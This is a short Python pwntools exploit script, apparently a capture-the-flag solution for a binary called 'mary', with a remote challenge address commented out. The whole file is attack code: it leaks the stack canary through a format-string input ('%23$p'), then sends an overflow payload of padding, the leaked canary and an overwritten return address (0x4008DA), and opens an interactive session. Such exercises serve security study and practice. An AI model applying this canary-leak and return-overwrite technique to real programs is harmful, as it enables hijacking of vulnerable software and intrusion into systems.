from pwn import *
#context.arch = "amd64"
#context.log_level = "debug"
 
p = process("./mary")
#p = remote('111.198.29.45','54470')
canary = ""
p.sendlineafter("3. Exit the battle \n","2")
p.sendline("%23$p")
sleep(0.5)
canary = p.recv(16)
cc = int(canary,16)
print(cc)
p.sendlineafter("3. Exit the battle \n","1")
 
payload = 'a'*0x88 + p64(cc) + 'a'*8 + p64(0x4008DA)
 
p.send(payload)
 
p.interactive()
